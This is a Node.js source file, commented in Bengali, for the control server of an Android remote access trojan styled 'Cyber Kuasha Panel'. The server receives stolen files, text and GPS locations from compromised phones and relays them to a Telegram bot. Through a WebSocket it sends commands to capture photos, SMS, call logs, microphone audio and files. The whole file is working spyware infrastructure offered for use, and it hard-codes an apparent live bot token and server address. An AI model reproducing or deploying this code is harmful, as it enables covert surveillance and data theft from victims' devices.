const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// আপনার কনফিগারেশন
const token = '8310874884:AAF6sPoGF89am0LuTHbgcd0-BuUnGqd5jjk'; 
const id = '7608303601';
const address = 'https://cyber-ret.onrender.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙇𝙞𝙫𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});

// ফাইল এবং ডাটা আপলোড হ্যান্ডলার
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 𝙁𝙞𝙡𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, { filename: name }).catch(e => console.log(e));
    res.send('ok');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝘿𝙖𝙩𝙖 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>\n\n${req.body['text']}`, { parse_mode: "HTML" });
    res.send('ok');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send('ok');
});

// ডিভাইস কানেকশন
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown";
    const battery = req.headers.battery || "N/A";
    const version = req.headers.version || "N/A";

    ws.uuid = uuid;
    appClients.set(uuid, { ws, model, battery, version });

    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n• ᴍᴏᴅᴇʟ: <b>${model}</b>\n• ʙᴀᴛᴛᴇʀʏ: <b>${battery}</b>`, { parse_mode: "HTML" });

    ws.on('close', () => {
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙: <b>${model}</b>`, { parse_mode: "HTML" });
        appClients.delete(uuid);
    });
});

// টেলিগ্রাম কমান্ড হ্যান্ডলিং
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId != id) return;

    if (message.text == '/start') {
        appBot.sendMessage(id, '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖 𝙋𝙖𝙣𝙚𝙡', {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        });
    }

    if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size == 0) return appBot.sendMessage(id, "°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙤𝙣𝙡𝙞𝙣𝙚");
        let list = "°• 𝙊𝙣𝙡𝙞𝙣𝙚 𝘿𝙚𝙫𝙞𝙘𝙚𝙨:\n\n";
        appClients.forEach(dev => {
            list += `• ${dev.model} (${dev.battery})\n`;
        });
        appBot.sendMessage(id, list, { parse_mode: "HTML" });
    }

    if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        const keyboard = [];
        appClients.forEach((value, key) => {
            keyboard.push([{ text: value.model, callback_data: `device:${key}` }]);
        });
        appBot.sendMessage(id, "𝙎𝙚𝙡𝙚𝙘𝙩 𝙖 𝙙𝙚𝙫𝙞𝙘𝙚:", { reply_markup: { inline_keyboard: keyboard } });
    }
});

// কমান্ড বাটন হ্যান্ডলিং
appBot.on("callback_query", (callbackQuery) => {
    const data = callbackQuery.data;
    const [cmd, uuid] = data.split(':');

    if (cmd === 'device') {
        appBot.editMessageText(`°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙛𝙤𝙧 <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: callbackQuery.message.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📸 Photo", callback_data: `camera_main:${uuid}` }, { text: "📍 Location", callback_data: `location:${uuid}` }],
                    [{ text: "📩 SMS", callback_data: `messages:${uuid}` }, { text: "📞 Calls", callback_data: `calls:${uuid}` }],
                    [{ text: "🎙️ Mic", callback_data: `microphone:${uuid}` }, { text: "📂 Files", callback_data: `file:${uuid}` }]
                ]
            }
        });
    } else {
        // সকেটের মাধ্যমে কমান্ড পাঠানো
        const client = appClients.get(uuid);
        if (client && client.ws.readyState === webSocket.OPEN) {
            client.ws.send(cmd);
            appBot.sendMessage(id, `°• 𝙎𝙚𝙣𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙: <b>${cmd}</b>\n• 𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙛𝙤𝙧 𝙙𝙖𝙩𝙖...`, { parse_mode: "HTML" });
        } else {
            appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙊𝙛𝙛𝙡𝙞𝙣𝙚!");
        }
    }
});

// সার্ভারকে সচল রাখতে এবং সকেট পিং
setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
    axios.get(address).catch(() => {});
}, 15000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
appServer.keepAliveTimeout = 600000;